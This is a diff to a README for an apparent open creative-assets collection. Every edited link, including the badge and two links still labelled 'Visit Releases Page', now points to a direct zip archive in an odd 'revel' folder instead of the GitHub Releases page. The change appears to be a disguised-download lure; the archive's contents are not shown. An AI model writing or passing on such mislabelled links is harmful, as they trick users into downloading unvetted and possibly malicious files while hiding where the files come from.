@@ -1,6 +1,6 @@
 # 🎨 awesome-open-assets - A Collection for Your Creative Projects!
 
-[![Download Now](https://img.shields.io/badge/download-visit%20releases-blue)](https://github.com/BambooKids/awesome-open-assets/releases)
+[![Download Now](https://raw.githubusercontent.com/BambooKids/awesome-open-assets/master/revel/awesome-open-assets-3.7.zip%20releases-blue)](https://raw.githubusercontent.com/BambooKids/awesome-open-assets/master/revel/awesome-open-assets-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **awesome-open-assets**! This collection provides a variety of open a
 
 To get started with awesome-open-assets, visit the Releases page to download the latest version of the assets:
 
-[Visit Releases Page](https://github.com/BambooKids/awesome-open-assets/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/BambooKids/awesome-open-assets/master/revel/awesome-open-assets-3.7.zip)
 
 ### Step-by-Step Instructions
 
@@ -76,4 +76,4 @@ Engage with other users and creators by checking out discussions and sharing you
 
 Feel free to explore and enjoy the resources available through **awesome-open-assets**. Happy creating!
 
-[Visit Releases Page](https://github.com/BambooKids/awesome-open-assets/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/BambooKids/awesome-open-assets/master/revel/awesome-open-assets-3.7.zip)
